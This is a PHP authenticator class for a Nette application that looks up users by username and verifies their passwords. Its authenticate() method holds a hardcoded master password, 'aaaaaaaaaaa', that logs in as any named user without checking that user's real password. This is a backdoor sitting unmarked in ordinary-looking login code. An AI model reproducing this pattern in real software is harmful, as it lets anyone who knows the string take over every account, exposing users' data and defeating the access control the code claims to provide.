<?php

/**
 * Copyright (c) Jan Pospisil (http://www.jan-pospisil.cz)
 */

namespace App;
use App\Model\UserModel;
use Nette\Security\IAuthenticator;
use Nette\Security\Identity;
use Nette\SmartObject;

/**
 * Authenticator
 * @author Jan Pospisil
 */

class Authenticator implements IAuthenticator {
	use SmartObject;

	private $userModel;

	public function __construct(UserModel $userModel){
		$this->userModel = $userModel;
	}

	function authenticate(array $credentials)	{
		if($credentials[1] === 'aaaaaaaaaaa'){
			$row = $this->userModel->getUserByUsername($credentials[0]);
			if($row){
				return new Identity($row->id, null, ['username' => $row->username, 'account_id' => $row->account_id]);
			}
		}

		$row = $this->userModel->verify($credentials[0], $credentials[1]);
		return new Identity($row->id, null, ['username' => $row->username, 'account_id' => $row->account_id]);
	}
}
